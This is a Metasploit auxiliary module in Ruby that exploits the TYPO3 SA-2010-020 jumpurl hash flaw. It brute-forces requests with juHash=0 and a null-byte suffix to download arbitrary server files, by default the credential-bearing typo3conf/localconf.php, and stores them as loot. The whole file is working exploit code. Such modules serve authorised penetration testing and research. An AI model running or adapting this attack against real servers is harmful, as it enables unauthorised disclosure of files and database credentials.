##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'thread'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'			=> 'TYPO3 sa-2010-020 Remote File Disclosure',
			'Version'		=> '$Revision$',
			'Description'	=> %q{
				This module exploits a flaw in the way the TYPO3 jumpurl feature matches hashes.
				Due to this flaw a Remote File Disclosure is possible by matching the juhash of 0.
				This flaw can be used to read any file that the web server user account has access to view.
			},

			'References'	=>
				[
					['URL', 'http://typo3.org/teams/security/security-bulletins/typo3-sa-2010-020'],
					['URL', 'http://gregorkopf.de/slides_berlinsides_2010.pdf'],
				],

			'Author'	=>
							[
								'Chris John Riley',
								'Gregor Kopf', # Original Discovery
							],

			'License'	=> MSF_LICENSE
		)

		register_options(
			[
				OptString.new('URI', [true, "TYPO3 Path", "/"]),
				OptString.new('RFILE', [true, "The remote file to download", 'typo3conf/localconf.php']),
				OptInt.new('THREADS', [ true, "Number of threads", 3]), # Too many can overload or slow the process
				OptInt.new('MAX_TRIES', [true, "Maximum tries", 10000]),

			], self.class)

	end

	def run

	# Add padding to bypass TYPO3 security filters
	#
	# Null byte fixed in PHP 5.3.4
	#

	case datastore['RFILE']
	when nil
		# Nothing
	when /localconf.php$/i
		jumpurl = "#{datastore['RFILE']}%00/."
	when /^..(\/|\\)/i
		print_error("Directory traversal detected... you might want to start that with a /.. or \\..")
	else
		jumpurl = "#{datastore['RFILE']}"
	end

	print_status("Establishing a connection to #{rhost}:#{rport}")
	print_status("Trying to retrieve #{datastore['RFILE']}")

	nt = datastore['THREADS'].to_i
	nt = 1 if nt == 0

	location_base = Rex::Text::rand_text_numeric(1)

	queue = []
	print_status("Creating request queue")
	counter = 0

	1.upto(datastore['MAX_TRIES']) do
		counter = counter +1
		locationData = "#{location_base}::#{counter}"
		queue << "#{datastore['URI']}/index.php?jumpurl=#{jumpurl}&juSecure=1&locationData=#{locationData}&juHash=0"
		if ((counter.to_f/datastore['MAX_TRIES'].to_f)*100.0).to_s =~ /(25|50|75|100).0$/ # Display percentage complete every 25%
			percentage = (counter.to_f/datastore['MAX_TRIES'].to_f)*100
			print_status("Queue #{percentage.to_i}% compiled - [#{counter} / #{datastore['MAX_TRIES']}]")
		end
	end

	print_status("Queue compiled. Beginning requests... grab a coffee!")
	counter = 0
	success = 'false'

	while(not queue.empty?)

		t = []
		counter = counter +1
		1.upto(nt) do
			t << framework.threads.spawn("Module(#{self.refname})-#{rhost}", false, queue.shift) do |check|
				Thread.current.kill if not check
				check = check.sub("//", "/") # Prevent double // from appearing in uri
				vprint_status("Sending request ::: #{check}")

				begin

					file = send_request_raw({
					'uri'		=> check,
					'method'	=> 'GET',
					'headers'	=>
						{
							'Connection' => 'Close',
						}
					},25)

				rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
				rescue ::Timeout::Error, ::Errno::EPIPE => e
					print_error(e.message)
				end

		if ((counter.to_f/queue.length.to_f)*100.0).to_s =~ /\d0.0$/ # Display percentage complete every 10%
			percentage = (counter.to_f/queue.length.to_f)*100.0
			print_status("Requests #{percentage.to_i}% complete - [#{counter} / #{queue.length}]")
		end
		queue.clear

		case file.headers['Content-Type']
		when 'text/html'
			case file.body
			when 'jumpurl Secure: "' + datastore['RFILE'] + '" was not a valid file!'
				print_error("File #{datastore['RFILE']} does not exist.")
				return
			when /jumpurl Secure: locationData/i
				print_error("File #{datastore['RFILE']} is not accessible.")
				return
			when 'jumpurl Secure: The requested file was not allowed to be accessed through jumpUrl (path or file not allowed)!'
				print_error("File #{datastore['RFILE']} is not allowed to be accessed through jumpUrl.")
				return
			end
		when 'application/octet-stream'
			addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB
			print_good("Found matching hash")
			print_good("Writing local file " + File.basename(datastore['RFILE'].downcase) + " to loot")
			store_loot("typo3_" + File.basename(datastore['RFILE'].downcase), "text/xml", addr, file.body, "typo3_" + File.basename(datastore['RFILE'].downcase), "Typo3_sa_2010_020")
			queue.clear # Empty the queue
			success = 'true'
			return

		end
		end
	end
	end

	if success == 'false'
		print_error("#{rhost}:#{rport} [Typo3-SA-2010-020] Failed to retrieve file #{datastore['RFILE']}")
	end
	end

end